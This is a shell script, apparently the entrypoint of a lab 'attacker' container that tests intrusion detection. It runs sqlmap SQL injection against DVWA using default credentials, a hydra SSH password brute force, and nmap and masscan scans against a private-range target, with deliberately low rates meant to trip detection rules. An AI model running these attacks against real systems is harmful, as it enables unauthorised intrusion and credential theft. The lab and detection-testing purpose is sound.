#!/bin/sh
# attack.sh - entrypoint dispatcher for the cyren-attacker image.
# One container = one tool, chosen by $ATTACK. All rate knobs default to GENTLE
# values (this is a realistic distributed attack, NOT a DDoS). Override any with -e.
#
#   -e ATTACK=sqli|hydra|nmap|masscan   (required)
#   -e TARGET=192.168.56.101            (DVWA/target IP; default below)
#   -e START_DELAY=0                    (seconds to wait before attacking = staggering)
#   rate knobs: SQLMAP_DELAY/SQLMAP_THREADS, HYDRA_THREADS, NMAP_MAX_RATE,
#               MASSCAN_RATE/MASSCAN_PORTS/MASSCAN_ROUTER_MAC
set -u

TARGET="${TARGET:-192.168.56.101}"
ATTACK="${ATTACK:-}"
START_DELAY="${START_DELAY:-0}"
DVWA_USER="${DVWA_USER:-admin}"
DVWA_PASS="${DVWA_PASS:-password}"

log() { echo "[cyren-attacker ${ATTACK:-?}] $*"; }

[ -n "$ATTACK" ] || { echo "ERROR: set -e ATTACK=sqli|hydra|nmap|masscan"; exit 2; }

# safety: only ever attack a private (RFC1918) lab address
case "$TARGET" in
  10.*|192.168.*|172.1[6-9].*|172.2[0-9].*|172.3[0-1].*) : ;;
  *) echo "ERROR: TARGET $TARGET is not a private lab address. Refusing."; exit 1 ;;
esac

# staggering: each container can wait before it starts (see run_distributed.sh / compose)
case "$START_DELAY" in ''|*[!0-9]*) START_DELAY=0 ;; esac
[ "$START_DELAY" -gt 0 ] && { log "stagger: sleeping ${START_DELAY}s before attacking"; sleep "$START_DELAY"; }

# --- DVWA login: print the "PHPSESSID=...; security=low" cookie for sqlmap ---
dvwa_login() {
  jar="$(mktemp)"
  t="$(curl -s -c "$jar" "http://$TARGET/dvwa/login.php" \
       | grep -oP "user_token'[^>]*value='\K[0-9a-f]+" | head -1)"
  curl -s -b "$jar" -c "$jar" -o /dev/null \
       --data "username=$DVWA_USER&password=$DVWA_PASS&Login=Login&user_token=$t" \
       "http://$TARGET/dvwa/login.php"
  t="$(curl -s -b "$jar" "http://$TARGET/dvwa/security.php" \
       | grep -oP "user_token'[^>]*value='\K[0-9a-f]+" | head -1)"
  curl -s -b "$jar" -c "$jar" -o /dev/null \
       --data "security=low&seclevel=low&user_token=$t" \
       "http://$TARGET/dvwa/security.php"
  sid="$(grep -i PHPSESSID "$jar" | awk '{print $NF}' | tail -1)"
  rm -f "$jar"
  [ -n "$sid" ] || { log "DVWA login failed (no session). Is DVWA up at http://$TARGET/dvwa/ ?"; return 1; }
  echo "PHPSESSID=$sid; security=low"
}

# --- masscan helpers: this container's own IP, and the target's MAC ---
my_ip()     { ip -4 addr show eth0 2>/dev/null | awk '/inet /{print $2}' | cut -d/ -f1 | head -1; }
target_mac() { ping -c1 -W1 "$TARGET" >/dev/null 2>&1 || true
               ip neigh show "$TARGET" 2>/dev/null | grep -oiE '([0-9a-f]{2}:){5}[0-9a-f]{2}' | head -1; }

case "$ATTACK" in
  sqli)
    # gentle: 1 thread, 1s delay between requests, low level/risk
    DELAY="${SQLMAP_DELAY:-1}"; THREADS="${SQLMAP_THREADS:-1}"
    cookie="$(dvwa_login)" || exit 1
    log "sqlmap SQLi (delay=${DELAY}s threads=$THREADS) cookie=$cookie"
    exec sqlmap -u "http://$TARGET/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
      --cookie="$cookie" --batch --flush-session --level=1 --risk=1 \
      --technique=BEU --delay="$DELAY" --threads="$THREADS" --dbs
    ;;
  hydra)
    # gentle: only 2 parallel logins; >5 failures trips the SSH threshold rule
    THREADS="${HYDRA_THREADS:-2}"; USER="${SSH_USER:-sysadmin}"
    log "hydra SSH brute (user=$USER threads=$THREADS)"
    exec hydra -l "$USER" -P /opt/passlist.txt -t "$THREADS" -f -o /dev/null "ssh://$TARGET"
    ;;
  nmap)
    # gentle: TCP connect scan of 1-1000, capped at 200 pkt/s (enough to trip PORTSCAN)
    RATE="${NMAP_MAX_RATE:-200}"
    log "nmap -sT scan (max-rate ${RATE} pps)"
    exec nmap -sT -p1-1000 --max-rate "$RATE" -Pn "$TARGET"
    ;;
  masscan)
    # raw-socket SYN scan; needs the target MAC (no OS routing) and its own source IP
    RATE="${MASSCAN_RATE:-300}"; PORTS="${MASSCAN_PORTS:-1-1000}"
    SRC="$(my_ip)"
    RMAC="${MASSCAN_ROUTER_MAC:-$(target_mac)}"
    log "masscan SYN scan (rate=${RATE} pps adapter-ip=$SRC router-mac=$RMAC)"
    if [ -n "$RMAC" ]; then
      exec masscan "$TARGET" -p"$PORTS" --rate "$RATE" -e eth0 --adapter-ip "$SRC" --router-mac "$RMAC"
    else
      log "WARN: could not resolve target MAC; masscan may attribute the scan to the wrong source. Set -e MASSCAN_ROUTER_MAC=<target-mac>."
      exec masscan "$TARGET" -p"$PORTS" --rate "$RATE" -e eth0 --adapter-ip "$SRC"
    fi
    ;;
  *)
    echo "ERROR: unknown ATTACK=$ATTACK (use sqli|hydra|nmap|masscan)"; exit 2 ;;
esac
